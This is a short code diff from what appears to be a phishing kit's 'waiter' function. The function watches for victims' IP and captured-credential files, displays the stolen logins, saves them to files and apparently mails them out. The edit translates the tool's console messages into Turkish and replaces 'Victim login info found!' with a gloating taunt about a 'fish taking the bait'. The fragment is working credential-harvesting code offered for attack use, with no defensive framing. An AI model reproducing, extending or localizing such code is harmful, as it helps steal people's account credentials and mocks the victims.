@@ -1435,7 +1435,7 @@ def waiter():
                 print(f"\n{info}{blue}SONRAKİNİ BEKLİYORUM{cyan}  Çıkmak İçin {red}Ctrl+C{cyan}'ye BASABİLİRSİN")
                 remove(ip_file)
             if isfile(cred_file):
-                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
+                print(f"\n\n{success}{bgreen}SAZAN OLTAYA DÜŞTÜ HAHAHAHA\n\007")
                 show_file_data(cred_file)
                 userdata = cat(cred_file)
                 if is_mail_ok:
@@ -1443,7 +1443,7 @@ def waiter():
                 append(userdata, main_cred)
                 append(userdata, saved_file)
                 print(f"\n{info2}KAYIT EDİLDİ !! {main_cred}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
+                print(f"\n{info}{blue}SONRAKİNİ BEKLİYORUM.....{cyan}ÇIKMAK İÇİN {red}Ctrl+C{cyan} 'ye BASABİLİRSİNİZ")
                 remove(cred_file)
             sleep(0.75)
     except KeyboardInterrupt:
